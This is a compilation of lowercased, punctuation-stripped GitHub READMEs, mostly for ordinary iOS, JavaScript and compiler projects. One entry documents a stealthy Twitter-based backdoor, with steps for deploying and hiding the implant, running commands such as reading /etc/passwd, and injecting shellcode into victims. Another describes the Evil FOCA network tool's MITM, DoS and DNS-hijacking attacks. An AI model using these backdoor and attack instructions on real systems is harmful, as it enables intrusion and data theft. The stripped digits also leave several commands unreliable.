and build to use reactivecocoalayout in your project you will need to include the reactivecocoalayout xcodeproj note not the xcworkspace file in your project and link reactivecocoalayout is released under the mit license see

24470284, the idea is to create a new isomorphic web publishing platform with the speed of a single page application but server side rendered on the first load at the time being developers are building entire applications in the browser using javascript the big part of the logic is living on the client and it talks to the server to an api once the application is fully loaded the user can gain a good experience navigating between pages without the need of fully reloading each time this is good what happens when your website is run by a crawler google bot or whatever if the website can only be executed on the client it won t be able to serve html to crawlers and this will have negative impacts on seo this is why morpheus is totally rendered on the server on the first load once done react will attach events to the dom and the user will feel the benefits of a single page application without having to wait for tedious spinners before seeing the content morpheus doesn t need a database it just renders static markdown files choose a name for you website for this example we will call it my website replace it with your name in the following commands create a directory for your blog and create a new git repo mkdir my website cd my website checkout the morpheus repository git pull s recursive x theirs morpheus master install the dependencies create the example post and run the application npm install gulp install this is important it will create an example post gulp watch create a new post or page inside the content and posts or content and pages folder then commit changes please note that the filename structure must follow the convention yyyy mm dd hhmmss post title md any page or post that contains a yaml front matter block will be processed by morpheus as a special file the front matter must be the first thing in the file and must take the form of valid yaml set between triple dashed lines take a look at the example post and page for more details if you have an existing repository add the morpheus remote to your local repository then merge its master branch with your local branch git fetch morpheus git checkout master git merge morpheus and master below is a list of the things to work on immediately with links to the relevant discussion please feel free to join the discussions build the app for production commit your production ready build and run it gulp build env production git add a git commit m ready nodeenv production node server js you can also override configuration in the proper environment specific configuration file inside the config folder below the production config file i use for hosting my website on openshift paas javascript use strict var path require path module exports level error  file path resolve process env openshiftdatadir and and  log log  debug false usessl true port process env openshiftnodejsport and and  ip process env openshiftnodejsip and and      disquscomments arnodo  sitetitle alessandro arnodo  sitedescription just another code monkey  pr and issues reporting are always welcome see more in contributing md file see changelog md file currently morpheus is in its very early stages and it isn t pretty it is far from usable set it up only if you know what you re doing and expect it to break a lot

23092863, manipulate data from api responses with ease inspired by modern object relational managers datacollection js is a javascript library for storage filtration manipulation and accession of large datasets it is ideal for working with data returned from restful api endpoints boasting synchronous performance that nears native array manipulation for large  recordsets let datacollection js do your heavy lifting for you you can begin using datacollection js by embedding the following script assumes it has been placed in your root directory alternatively the minified version can be found at you can then start using datacollection objects with javascript var dc new datacollection npm install data collection followed by a script with this require javascript var datacollection require data collection datacollection can be used for fast synchronous processing of large datasets arrays of objects i e a restful api response it is especially useful for maintaining maps of specific keys and indexing let s say that i have a standardized array containing the results of a restful api response my data set looks like this javascript var characters id  firstname jon  lastname snow  gender

19585765, creating html email that renders well across most clients is surprisingly hard especially when you want it to be responsive salted is a responsive email template that tries to make things easier disclosure i m lucky enough to work for litmus one of the smartest groups of people around our emails typically take an opinionated approach to design and code and the salted template reflects that adapt as necessary a lot of web designers are surprised by some of the stuff going on in html email so here s a breakdown of what you ll find in the salted template feel free to swap them out and adjust for your own purposes unfortunately a lot of email clients block images by default the images in the stacked tables are examples of how to properly code images for email they include specific dimensions alt text and styles for keeping your alt text looking nice when images are disabled note the images in the salted template use relative paths which will not work in real campaigns update your image paths to be absolute and point to a publicly accessible server to ensure that your subscribers get to look at all of your pretty graphics using images for buttons is so last season to ensure that your calls to action display even when images are disabled we use our own breed of bulletproof buttons throughout the buttons rely on thick borders for their structure and some css for round corners using borders instead of padding on the table cell our old approach keeps the entire button tappable not just the text inside you can easily style the buttons using the inline styles and adjust on mobile by targeting the mobile button class the salted template is fully responsive so much as an html email can be it uses fluid tables fluid images and media queries to adjust content and layout on mobile devices that support it be warned if you thought the browser wars were bad just wait until you start dealing with email clients there are dozens of popular email clients that all support html and css to varying degrees while the salted template is very robust it won t look perfect in every client that s just the nature of the game while this code has been tested thoroughly through countless litmus newsletter sends when adapting it for your own purposes i recommend you test the hell out of your campaigns as mentioned before email clients are a finicky bunch and you re likely to run into issues at some point

29719736, demo screenshots and logo png a uitableviewcontroller subclass designed with efficiency and maintenance in mind and tries its best to handle just about everything for you no more if statements and switches in every table view datasource and delegate method no more splitting up all the logic for each row and section into a dozen different methods making addition removal or minor alterations to format and layout a headache we feel your pain we know the struggle moving one section of cells below another moving cells between sections adding new cells to existing sections etc  with a decently complex table view can be a nightmare but with organic it s as simple as changing the order of objects in an array organic allows you to define the sections and which cells they contain all at once and takes care of the rest of the housekeeping for you ignoring the custom cells which are created in their respective classes creating the below table view with organic took less than  lines of code demo screenshots and demo png installation pod  organic get started organicviewcontrollers are comprised of sections that can either be static and pre generated or can contain reusable cells that can be dequeued and customized for better performance and efficiency in the above example showing a github profile the first section with  cells is pre generated whereas the repositories section is built using reusable cells building pre generated cells not for reuse to do this you first need to subclass or create instances of organiccell these cells encapsulate two major properties height and actionblock the height property as the name indicates defines the height of the cell when you layout your cell and all of its subviews you can set the height based on the contents and the cell itself will be responsible for reporting the proper size in heightforrowatindexpath if this is never set uitableviewautomaticdimension is the fallback the actionblock property defines the action that will be performed when the cell is selected and didselectrowatindexpath is called setting the actionblock property on the cell when you create it allows you to keep the behavior of the cell when selected paired with the creation of the cell so if you ever want to modify this cell and the action associated with it you don t need to go searching through the code to find where it is defined if this property is never set nothing happens when the cell is selected objective c organiccell mycell organiccell cellwithstyle uitableviewcellstyledefault height  actionblock and and do whatever you want here when the cell is selected building sections with pre generated cells the organicsection object encapsulates all of the properties that define a table view section whatever you set the headertitle and and or footertitle properties as will be returned in the titleforheaderinsection and titleforfooterinsection methods respectively if you want to define a uiview as the viewforheaderinsection or viewforfooterinsection  set the headerview and and or footerview properties on the object whenever you re defining either a header or footer view be sure to also set the accompanying headerheight and footerheight properties so when heightforheaderinsection and heightforfooterinsection are called the table view will make it fit accordingly lastly every section will contain an array of organiccell objects that you create that will be returned in the defined order inside cellforrowatindexpath various convenience class methods have been created with the different combinations of titles and views to make your life a little easier sections can contain any combination of titles and views that you want as long as they don t use both a title and a view for the header or footer if this were to occur the views would take precedent objective c and instancetype sectionwithcells nsarray cells and instancetype sectionwithheadertitle nsstring

of an nsarray cellheight is what you would normally return in heightforrowatindexpath currently organic only supports a single height for all cells in a section supporting reuse i am looking into ways to get around the fact that heightforrowatindexpath is called before cellforrowatindexpath  which causes headaches galore for people who want to let their cells determine their height once they are created cellforrowblock is a block that is called when the parent organicviewcontroller s cellforrowatindexpath is called you will be provided a reference to the table view and the row index and should implement this the same way you would normally implement cell reuse actionblock is a block that is called when the cell is selected you are provided the row index for this and can define the action you want to occur when a cell at that index is tapped putting it all together first subclass organicviewcontroller you can choose when and where to define your sections viewdidload or viewwillappear are two decent candidates create your cells insert them into sections insert the sections in an array in the order you want and set them as the sections property there is no need to reloaddata after doing this setting the sections will take care of that automatically here is a simple example of a table view with three section two that are pre built and one that supports reuse and

13372956, animations and transitions are fairly crucial to the look and feel of modern applications and can be a good way of indicating to a user what their interactions are doing indeed the best interfaces have been clued up on this for a while now pretty much every interaction you have with ios involves an animation however animations can get convoluted really fast especially if you have a lot of different states which require different transitions depending on which states are being entered or left this is a problem i ve struggled with in more complex uis specifically figuring out the position of elements we ended up using position absolute for everything and having a huge amount of conditional code containers magicmove easing ease  duration  function var el section third and section this find second after el the second argument to fn magicmove is a callback which gets executed in the context of whatever element you re transitioning simply manipulate the dom hide or show elements add or remove classes and the changes will be animated the library works by appending a separate and hidden clone of the element you re transitioning to the page any dom manipulation you do is actually manipulating that clone then when you re finished the library looks at the difference between the element s current position and the clone s position and animates between them using css transitions

42162816, a stealthy python based backdoor that uses twitter direct messages as a command and control server for this to work you need a twitter account use a dedicated account do not use your personal one install the dependencies pip install r requirements txt this repo contains two files twittor py which is the client implant py the actual backdoor to deploy in both files edit the access token part and add the ones that you previously generated python consumertoken xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx consumersecret xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx accesstoken xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx accesstokensecret xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx username xxxxxxxxxxxxxxxxxxxxxxxx in order to remove the console when compiling with pyinstaller the flags noconsole onefile will help just saying in order to run the client launch the script python twittor py you ll then get into an interactive shell which offers few commands that are refresh refresh c c control listbots list active bots listcommands list executed commands retrieve jobid retrieve jobid command cmd mac address command execute the command on the bot shellcode mac address shellcode load and execute shellcode in memory windows only help print this usage exit exit the client once you ve deployed the backdoor on a couple of systems you can check available clients using the list command listbots b  f b  b linux x x x generic x with ubuntu   precise the output is the mac address which is used to uniquely identifies the system but also gives you os information the implant is running on in that case a linux box let s issue a command to an implant cmd b  f b  b cat and etc and passwd and sent command cat and etc and passwd with jobid umwr here we are telling b  f b  b to execute cat and etc and passwd  the script then outputs the jobid that we can use to retrieve the output of that command lets get the results retrieve umwr root x   root and root and bin and

retrieve followed by the jobid from the command refresh results in order to retrieve new bots and command outputs but also force the client to refresh the results use the refresh command refresh and sending command to retrieve alive bots and sleeping  secs to wait for bots this will send a ping request and wait  seconds for them to answer direct messages will then be parsed bot list will be refreshed but also the command list including new command outputs retrieve previous commands as i said earlier previous commands will be retrieved from older direct messages limit is  and you can

4751435, configurable column widths gutters and margins fixed position elements elements spanning columns keep with next to avoid headings at the bottom of a column no wrap class to avoid splitting elements across columns grouping of columns into pages horizontal or vertical alignment of pages standardised line height to align text baseline to a grid rapid reflow as required by events such as device orientation or font size change include ftcolumnflow js in your javascript bundle or add it to your html page like this the script must be loaded prior to instantiating ftcolumnflow on any element of the page ftcolumnflow adds pages and columns to the dom inside a specified target element which must be a child of the viewport element the resulting pages are the same dimensions as the viewport  which allows for a scrolling window of multiple target s and pages to sit inside it ftcolumnflow accepts two types of content fixed and flowed  which can be specified either as text strings or as dom nodes from which to copy elements fixed elements can be positioned using css classes to specify page number vertical and horizontal anchoring column span and span direction flowed elements will be flowed over columns and pages created automatically and can optionally include css classes to control wrapping behaviour to activate ftcolumnflow on an article create a target element inside a viewport section id viewport and section create a new instance of ftcolumnflow passing either id names or dom element references for target and viewport  along with an object of configuration parameters all of which are optional javascript var cf new ftcolumnflow article   viewport  columncount  standardiselineheight true pagepadding  javascript var articleel document getelementbyid article  var viewportel document getelementbyid viewport var cf new ftcolumnflow articleel viewportel columncount  standardiselineheight true pagepadding  to render flowed content pass either text strings or dom nodes into the ftcolumnflow flow method for example if you have the following content separated into flowed and fixed groups h the metamorphosis and h h franz kafka  and h figure class anchor bottom col  and figure you could apply ftcolumnflow to this content with code such as javascript var flowedcontent document getelementbyid flowedcontent  fixedcontent document getelementbyid fixedcontent cf flow flowedcontent fixedcontent alternatively you can pass your content into the flow method directly javascript here are some examples of ftcolumnflow in use feel free to copy the code and use as the basis for your own projects with ftcolumnflow ftlabs have addressed some of the limitations of the css multi column specification we needed an approach which would give accurate and flexible newspaper style column layouts to which we could add fixed position elements spanning over any number of columns flowing text over columns using javascript is not so easy although it s trivial for a human to spot the last word before a column boundary not so for a computer our first iteration looped through each word in the flowed text to determine whether or not it was within the bounds of the current column when the first out of bounds word was found the paragraph was split and the second part moved over to a new column however this was found to be very slow and dom heavy especially with long paragraphs configuration options can be specified at create time by passing a json object as the third argument to the ftcolumnflow constructor all parameters are optional any which are specified will override default values pageclass mypageclass  class name to add to each page created by ftcolumnflow class names are normalised invalid characters are replaced with a string

23894783, collection of must have functional tools trying to be as lightweight as possible hopefully providing a simple foundation that more advanced systems can build on llamakit is very cocoa focused it is designed to work with common cocoa paradigms use names that are understandable to cocoa devs integrate with cocoa tools like gcd and in general strive for a low to modest learning curve for devs familiar with objc and swift rather than haskell and ml there are more functionally beautiful toolkits out there examples llamakit intentionally is much less full featured and is focused only on things that come up commonly in cocoa development within those restrictions it hopes to be based as much as possible on the lessons of other fp languages and i welcome input from folks with deeper fp experience currently has a result object which is the most critical and in the end it may be the only thing in the main module result is mostly done except for documentation in progress tests are built though there are some small differences i haven t decided if a promise isa future or hasa future the scala approach is a weird hybrid it technically hasa future  but in the main implementation the promise is its own future  so it s kind of isa too still a work in progress there i m considering pulling future out it already makes this module too complicated did i mention that llamakit wants to be really really simple llamakit should be considered highly experimental pre alpha in development i promise i will break you but the result object is kind of nice already if you want to go ahead and use it d current thinkings on structure  this is highly in progress and subject to change like everything comments welcome llamacore the absolute basics if it s in llamacore i believe that the majority of swift developers should be using it i think other libraries should bulid on top of it i think apple should put it into stdlib this is the stuff that i worry many developers will reinvent and that will cause collisions between code bases llamacore strives to be incredibly non impacting it avoids creating top level functions that might conflict with consuming code it declares no new opeartors the bar is very high to be in llamacore it currently contains just two types result which i think apple should put into stdlib and box which only exists because of swift compiler limitations in the ideal llamakit llamacore would be empty llamafuture concurrency primitives most notably future in my current design future is actually stand alone and doesn t require llamacore but i think that most developers will want a failable future result which i am tentatively calling task i also expect this to hold promise  which is a future that the caller manually completes this is still under very heavy consideration i m not sure exactly what i want yet llamafuture is tightly coupled to gcd and is intended as a nicer interface to common cocoa concurrency primitives not a replacement for them functional composition with operators like and and is a beautiful thing but it carries with it a lot of overhead not only are there cognative loads the code is not obvious at all to the uninitiated  there are non trivial compiler and language impacts operators are declared globally specifically precedence and associativity the swift compiler has some serious performance problems building code with complex operator usage and in the case of operator conflict the resulting errors are very confusing widely used libraries should strongly avoid bringing in new operators implicitly my intention is that you would always have to import llamaops explicitly even if you import the umbrella llamakit i do expect most of the things in llamakit to be useful to many if not most cocoa devs i don t want to force you to take everything but i do want to make it easy to take everything except operators so hopefully i can provide an umbrella framework i don t know if that actually works in xcode but we ll see at this point i m not expecting a ton more stuff but this is where it would go while i m evangelizing functional programming i want most people to use swift to achieve that not lots of layers on top of swift so for instance i m not particularly sold on an either right now in most cases i d rather you use an enum directly and i don t want to create a full functor applicative monad hierarchy typelift is covering that for us i probabaly do want somewhere to put sequence  lift  pure  and flip and maybe that could become llamalambda llamalamb llamafunc but i want to go slow there and see what needs arrise in real projects
22042992, rhine is a clojure inspired lisp on llvm jit featuring variable length untyped arrays first class functions closures and macros while clojure hides the lower level details by running atop the jvm rhine aims to expose how common lisp constructs map to hardware first opam switch    to make sure that you re running a custom built ocaml for camlp first run brew install libffi then run opam install ocamlfind menhir core textutils ctypes  open a new shell to refresh env and invoke make there are a number of reasons for the build failing  silly things like git submdoule init failing can be fixed easily just anchor the submodule to a valid commit and send a pr  opam problems if you run into one of these after following the instructions presented above open an issue an upstream update probably screwed something up  silly build issues usually arise from the build not being perfectly parallel due to races the j picks the dependee too earlier either go into llvm build and and keep hitting make j until it succeeds or drop the j together waiting for a longer time for a predictable result  running into more serious build issues usually means that llvm upstream has changed in a trivial way you can attempt to fix this yourself or open an issue an untyped system means that all values are boxed and unboxed from a valuet structure at runtime valuet type i type of data i integer i bool i  string valuet  array and fenv i array and string length double double valuet i valuet   function i char the overhead of boxing and unboxing is paid by all dynamic languages although multiple optimizations including speculative optimization can reduce the overhead rhine currently only implements the basic optimizations bundled with llvm rhine does automatic type conversions so and    will do the right thing to implement this ir is generated to inspect the types of the operands zeroth member of valuet  and a br branch is used to take the right codepath a possible optimization is to generate a branchless codepath for all integer arguments llvm provides the array used since they are fixed length i e the length must be known at compile time the problem is that a construct like cons  coll generates a runtime length which is equal to the length coll and  so we malloc getelementptr and store by hand it has the type specified by the fourth member of valuet to implement first class functions note that all functions must have the same type i e the type of the function pointer the seventh member of valuet how else would you implement clojure defn map f coll if coll cons f first coll map f rest coll defn map f c c if and c c cons f first c first c map f rest c rest c here f takes one argument in map  but takes two arguments in map a function pointer type embracing variable arguments is implemented using the varargs of llvm note that vaarg doesn t work on x so rhine extracts the values by hand the first argument gives the number of arguments and is used to implement varargs in the rhine language the second argument is the closure environment which has the same type as an closures are simple to implement with this framework in place first when a function is declared parse out all the unbound variable names not present in arguments or let  sort the names put it in a hashtable for later reference and codegen the code required to bind the names from the env argument in order at the callsite look up this hashtable and pack all the corresponding environment variables into the env argument so stuff like this will work clojure defn quux let a aenv println a println env let env  aenv  quux but there s a problem because we have first class functions what happens to this clojure defn t y and x y defn f x t let g f  println g  here the callsite for t is not in f  but in the anonymous function at the end but the anonymous function doesn t have the environment variable x that t requires f does so we have to augment function pointers with the environment resuing the fourth argument of valuet it s important to realize that macros require that we go back and forth between llvm values and the ocaml codegen engine how else would you evaluate something like clojure defmacro baz x   x baz and   note that macro arguments must be passed unevaluated at the callsite the maco expand stage now needs to codegen   something  where that something itself needs to be codegen ed by evaluating the argument the result from the compiler must be returned as an ast object to ocaml this requires some involved construction of ocaml objects from c another subtle point to note is that macros must be lifted out of the program and macro expanded at the beginning of the program this is because we can t suddenly codegen segments required for macroexpansion in the middle of codegen ing another function lambdas requires lifting them out and codegen ing them first garbage collection llvm provides several garbage collection intrinsincs but the main challenge is to make sure that the c bindings don t leak memory custom optimizations copy on write for persistent data structures and persistent variables with setq how do you access a variable s history ffi to c it s simply a question of defining a good interface because we already use malloc and memcpy internally in llvm ir self hosting compiler necessary to co develop the language and compiler optional typesystem use the syntax to provide type safety and optimizations concurrency primitives see clojure s core async support for programs spanning multiple files polished error reporting with file line annotations llvm codegen statements all have side effects in most places order in which variables are codegen ed are unimportant and lets can be moved around but in conditionals statements must be codegen ed exactly in order this means let statements can t be permuted leading to imperative style ocaml code since llvm ir is strongly typed it is possible to inspect the types of llvales from ocaml at generation time however there is no way for the codegen stage to inspect the values of variables while the program is running this has the consequence that a loop hinged upon an llvalue must be implemented in llvm ir hence for functions that require iterating on variable length arrays we end up writing tedious llvm ir generation code instead of an equivalent ocaml code debugging errors from llvm bindings is hard using ocamldebug does not work since the callstack leading up to an llvm call in c and and is not owned by ocaml the alternative is to use lldb but matching up the c and and call with a line in the ocaml code is non trivial implementing complex functions as builtins by directly generating ir is perhaps more efficient than implementing them in rhine but the gap is very small due to optimization passes applied on the rhine generated ir the marginal benefit outweighs the cost of correctly weaving complex ir

15310718, svgmagic cross browser svg the plugin will continue to work but no guarantees will be given over the api s availability it has been a great ride this ease to use jquery plugin will create a fallback for svg images on your website when the plugin notices that the visitors browser doesn t support svg images it will replace those images with new png images those png images are created on the run using a serverside script when the visitors browser does support svg images it will just go back to sleep a big advantage of svgmagic is that you don t have to create multiple versions of your images you can just focus on the svg images and let svgmagic do the rest svg what and why  svg is a vector graphics format meaning it s perfectly scalable whatever size it needs to display at or whatever screen it needs to display on an svg will adapt perfectly this means that you can use the same image for desktop and mobile including retina visitors they all get a perfectly sharp image installation  just include the script in your header and call the plugin in your document ready document ready function img svgmagic and script svgmagic also supports backgroundimages you need to parse the div containing the backgroundimage including the backgroundimage option document ready function bgimage svgmagic handlebackgroundimages true  and script you can parse an options object into svgmagic currently it supports the following options img svgmagic temporaryholdingimage null and and image that will appear when an image gets converted forcereplacements false and and force replacement in all browsers handlebackgroundimages false and and search the dom for css background images additionalrequestdata  and and add extra data to the ajax request postreplacementcallback null and and function to run before replacement and and new options remoterequesttype post  and and request type for the api call remotedatatype jsonp  and and data type for the api call debug false and and show usefull debug information in the console the additionalrequestdata option gives you the posibility to add extra data to the ajax request the default api script supports two extra options secure true and dumpcache true local development  svgmagic needs public access to the images on your website which means that you can t use it when developing in a local environment in case you still need to use the plugin you can download the converter php script and place it on your local machine the plugin is tested in internet explorer version  and  other browsers already support svg files security and how it works the script makes use of a server side php script that converts the svg to an png the plugin will send a request to the server containing the images sources the server will then grab those images convert them to png temporarily save them and send the url of the new images back to the plugin when the plugin receives the new url it will replace the svg images with the new ones this will only happen when the plugin notices that the user s browser doesn t support svg images at the moment ie and lower and android  don t support svg images known bugs  when many images need to be replaced the url can get too long which will result in a server  error changelog  new features svgmagic can now return usefull debug information while replacing svg images added timeout to ajax request show debug information when timeout gets exceeded new options debug show usefull debug information in the console documentation added changelog to the bottom of the readme automatically return images over https when request was over https new features fully rewrite of the server script the server will now provide much more information about the convert process response will contain the creation date of cached images data images are now also cached new features add extra post data to the ajax request now also finds data image svgs new options temporaryholdingimage replacement for preloader forcereplacements replacement for testmode handlebackgroundimages replacement for backgroundimage additionalrequestdata send extra data to the server that replaces the svgs for pngs postreplacementcallback callback function that will be executed before replacement remoteserveruri the uri of the remote server that converts the images to png remoterequesttype set the type of the ajax request post and get remotedatatype the datatype sent to and received from the remote server deprecated options preloader temporaryholdingimage testmode forcereplacements backgroundimage handlebackgroundimages secure additionalrequestdata callback postreplacementcallback dumpcache additionalrequestdata

2085509, openclustermapview is a simple and easy to use extension of mkmapview for ios if you are displaying a lot of annotations on the map this class is made for you ocmapview automatically creates clusters by combining annotations super fast it works with any ios application no code changes needed screenshots screenshots jpg screenshots fast and easy handle over  annotations on the map at once very simple usage no code changes needed just replace the mapview class easy to integrate keep all mkmapview delegate methods as they are customize the mkannotationviews of generated clusters like any other annotation customize behavior like the cluster size two different clustering algorithms provide an ignore list of annotations that wont be clustered create independent clusters by using groups just install the pod using pod ocmapview add the ocmapview folder to your project link with the mapkit and corelocation frameworks you may already have encountered the problem when adding a several hundred annotations to the mkmapview  it will get laggy and everything but user friendly many developers believe that ios can t handle a huge amount of annotations on a mkmapview due to the low memory capacities of idevices so they start to handle the annotation management themselves with pretty dumb filter methods which won t display all annotations and confuse users even more the actual problem is not memory related it rather occurs because annotationviews are uiviews and these are extremely slow so if you scroll and zoom a mkmapview with many annotations ios has to redraw them all at once and that will take time ocmapview combines multiple annotations in a specified range and displays them just as a single annotationview for the whole cluster so you ll never have too many views which make your app slow and laggy in addition to that forget to handle the annotations yourself just add them all to your ocmapview and it will do everything for you even the iphone g with ios   x can handle a couple thousand annotations without lagging just replace your mkmapview references with ocmapview it automatically handles annotations and combines them to clusters for you without any other change of your code add the annotations you want to display as usual and implement the same mkmapviewdelegate methods like before the handling stays completely the same so you can easily use custom views for your annotations and clusters the viewforannotation delegate method will return ocannotation objects for generated clusters this is how to provide custom views mkannotationview mapview mkmapview amapview viewforannotation id mkannotation annotation and and if it s a cluster if annotation iskindofclass ocannotation class and and create your custom cluster annotationview here  and and if it s a single annotation else if annotation iskindofclass yourannotation class and and create your custom annotationview as regular here  return yourannotationview for more informations have a look at the example project you can cluster different groups of annotations as seen on the screenshots above like this implement the ocgrouping protocol on your annotation class set its grouping tag and set the clusterbygrouptag property of your ocmapview to true take a look at the sample project to see how it works apps that use ocmapview official cargo app cost control for cargo aka acargo and a lot of more who do not tell me if you are using ocmapview and want to contribute please contact me to add your app to the list of supporting apps openclustermapview logo oclustermapview and sample and images and logo and ocmapviewlogo x png openclustermapview logo

13026021, this is a fast super slave dns server designed to be constantly attacked on the public internet the intent is to shield master servers that are hidden behind firewalls the key feature is a built in custom tcp and ip stack capable of handling millions of dns queries per second per cpu core currently this tool is in a prototype stage it parses records and responds to queries on port  but it s missing key features such as dynamic updates the only dependency is libpcap dev or winpcap just type make to build the software on linux mac os x and windows the included xcode and vs projects should also work on mac and windows respectively the easiest way to test the server is to run on the comman line with one or more dns zone files like so robdns example zone this will start listening on the any ip address v and v on port  zone files are in the standard format with a filename ending in zone  and starting with an soa record to test that it s running you can use the normal dig command dig chaos txt version bind localhost and short you should get back the version string of robdns and  however the above example is the slow way of running the software the intended use is to bypass the kernel s network stack using special drivers like pfring to run in this faster mode install the drivers and run with a command like the following robdns example zone dna     in this example the server will use it s own user mode tcp and ip stack instead currently this benchmarks to about  million packets per second for each cpu core the following rr types have been implemented soa ns a aaaa ptr cname sshfp loc txt srv spf hinfo mx dnskey nsec nsec nsecparam rrsig ds tlsa the following interfaces are supported sockets libpcap pfring this tool created by robert graham email robertdavidgraham yahoo com twitter erratarob
39375682, windows xp or later net framework  or later evil foca is a tool for security pentesters and auditors whose purpose it is to test security in ipv and ipv data networks the tool is capable of carrying out various attacks such as mitm over ipv networks with arp spoofing and dhcp ack injection mitm on ipv networks with neighbor advertisement spoofing slaac attack fake dhcpv dos denial of service on ipv networks with arp spoofing dos denial of service on ipv networks with slaac dos dns hijacking the software automatically scans the networks and identifies all devices and their respective network interfaces specifying their ipv and ipv addresses as well as the physical addresses through a convenient and intuitive interface the well known  man in the middle is an attack in which the wrongdoer creates the possibility of reading adding or modifying information that is located in a channel between two terminals with neither of these noticing within the mitm attacks in ipv and ipv evil foca considers the following techniques arp spoofing consists in sending arp messages to the ethernet network normally the objective is to associate the mac address of the attacker with the ip of another device any traffic directed to the ip address of the predetermined link gate will be erroneously sent to the attacker instead of its real destination dhcp ack injection consists in an attacker monitoring the dhcp exchanges and at some point during the communication sending a packet to modify its behavior evil foca converts the machine in a fake dhcp server on the network neighbor advertisement spoofing the principle of this attack is identical to that of arp spoofing with the difference being in that ipv doesn t work with the arp protocol but that all information is sent through icmpv packets there are five types of icmpv packets used in the discovery protocol and evil foca generates this type of packets placing itself between the gateway and victim slaac attack the objective of this type of attack is to be able to execute an mitm when a user connects to internet and to a server that does not include support for ipv and to which it is therefore necessary to connect using ipv this attack is possible due to the fact that evil foca undertakes domain name resolution once it is in the communication media and is capable of transforming ipv addresses in ipv fake dhcpv server this attack involves the attacker posing as the dchpv server responding to all network requests distributing ipv addresses and a false dns to manipulate the user destination or deny the service denial of service dos attack the dos attack is an attack to a system of machines or network that results in a service or resource being inaccessible for its users normally it provokes the loss of network connectivity due to consumption of the bandwidth of the victim s network or overloads the computing resources of the victim s system dos attack in ipv with arp spoofing this type of dos attack consists in associating a nonexistent mac address in a victim s arp table this results in rendering the machine whose arp table has been modified incapable of connecting to the ip address associated to the nonexistent mac dos attack in ipv with slaac attack in this type of attack a large quantity of  router advertisement packets are generated destined to one or several machines announcing false routers and assigning a different ipv address and link gate for each router collapsing the system and making machines unresponsive dns hijacking the dns hijacking attack or dns kidnapping consists in altering the resolution of the domain names system dns this can be achieved using malware that invalidates the configuration of a tcp and ip machine so that it points to a pirate dns server under the attacker s control or by way of an mitm attack with the attacker being the party who receives the dns requests and responding himself or herself to a specific dns request to direct the victim toward a specific destination selected by the attacker

8237199, motion xray developer tools for ios runs on the device no browser or computer needed think firebug or webkit developer tools  gem install motion xray  replace uiwindow with motion xray xraywindow and if you want the email features add app frameworks messageui to your rakefile the problem  during development we rely heavily on the simulator to quickly view and test features but often when we finally install our app on a device the experience is not up to snuff with what was going on in the simulator views are off by a few pixels performance is not what we expect and crashes occur where we never saw them in the simulator sometimes these are device problems sometimes it has to do with dropping in and out of signal all sorts of scenarios that we cannot easily test for in the simulator and of course there is the problem that ios devices have more features than the simulator bluetooth  for example is not easy to get setup in the simulator and you have to buy a usb bluetooth module my thesis is that we need to make on device testing a more enjoyable and useful testing environment so that we are compelled to test on it sooner and more my proposal  motion xray is such a solution during development you can use xray as a ui inspector or to monitor the console log preview how accessibile your app is to blind and color blind developers  or you can create a plugin that provides information specifically useful to your app below i ll show how to create a new plugin check out the plugins folder for some examples if you clone and run xray in the simulator you will see a very boring app activate a shake gesture by pressing   z and xray will activate which displays this the application shrinks down to a quarter size and the development environment takes up the remaining space that is xray an in app debugging and development environment smiley that s enough to have the motion xray toggle command fired whenever you shake the device if you want to use some other mechanism that launches xray a complicated gesture recognizer would be a good candidate  you can call xray toggle which calls either xray fireup or xray cooldown the motion xray xraywindow class is only used to listen for the shake event so using it will not affect your app in any other way when you shake your phone and activate xray you are presented with three panes and a toolbar at the bottom all the views under the main window are placed in the preview area if you touch this area you can get a quick preview of the view or you can quickly change to another view or change orientation after a few seconds xray will automatically be displayed again if you want to leave the xray debug area you should shake the phone again this pane shows the view hierarchy of your app all the views on screen can be selected here and a red box will show the bounds of that view in the preview pane if you touch it again that view will be sent to whatever plugin you have visible or you can press the down button in the bottom right corner of this pane not all plugins respond to the selected view for instance the accessibility plugin will always display the entire screen regardless of which view is selected the log plugin on the other hand displays the inspect information about the view and of course the ui plugin will change so that you can edit the properties of that view the button in the upper left corner expands this view so that you can see the tree easier in the upper right corner is the button to activate a visual view selector you can tap a view to get information about it or press and hold to make that view go away so that you can choose the view behind it or double tap to select that view here s where the inspector and other plugins live with a toolbar at the bottom to select what plugin you want to view it is very easy to create new plugins i ll go over that below after you create a new plugin you register it with xray xray register yourplugin new built in plugins  included automatically the original idea for xray was just this ui plugin the other plugins came later i realized that it could and should be a generic development environment instead of a ui editor also some early feedback from the hipbyte team helped open up this world of possibilities uiplugin uses a pluggable architecture first there are the editors motion xray texteditor motion xray coloreditor motion xray booleaneditor motion xray frameeditor second these editors get associated with the view properties in a hash that is returned by the class method uiview xray in custom views you only need to return the properties that your custom view uses any editable properties in views you inherit from will be included don t do any merging in your xray method that is handled by the plugin by uiview buildxray  in xrayext rb class uilabel def xray content section name text motion xray texteditor property editor class if you inherit from a view and you want to disable one of the editors assign nil as the editor for that property uiwindow does this to prevent editing frame  hidden  and userinteractionenabled properties from getting changed class uiwindow def xray turnoff frame nil hidden nil userinteractionenabled nil writing custom editors can be time consuming because they are often very ui heavy check out the coloreditor to see what i mean that said the concept is very easy  extend the motion xray propertyeditor class  return your editor in the editview containerwidth method you don t have to use the entire width but your editor view can t be any wider if you want you can return a preview that just shows the value with a button that opens a much larger editor coloreditor and texteditor behave this way  to get the value of the property being edited use the method getvalue it will introspect self target looking for a the appropriate getter method  whenever the value changes assign the new value to setvalue  and that will fire a xraytargetdidchangenotification notification which is used by motion xray saveuiplugin setvalue will like getvalue  look for an appropriate setter the editors should be able to be used for many properties but if you re writing a one off editor i suppose you could call the getters and setters directly but you should post the xraytargetdidchangenotification notification if you do after you have made your changes to your uiview s you will want to save those changes right this plugin is your friend it is not included by default though because not everyone uses teacup or pixate many of the properties that you ll be editing will already have the appropriate output in this plugin it uses inspect  but the way that xray records your changes can be customized in two ways  change the type of output that you want the default is teacup  but it is possible to setup the saveuiplugin to record nui or pixate changes as ruby motion xray registerplugin motion xray saveuiplugin new use teacup motion xray registerplugin motion xray saveuiplugin new pixate  register custom output by class this will be used for any property for instance if you want uicolor objects to be persisted as an array of rgb values you could register that output like this ruby register teacup uicolor and color and color red  color blue  color green because xray uses sugarcube a lot of the hard work is done for us there because sugarcube implements lots of useful tos and inspect methods 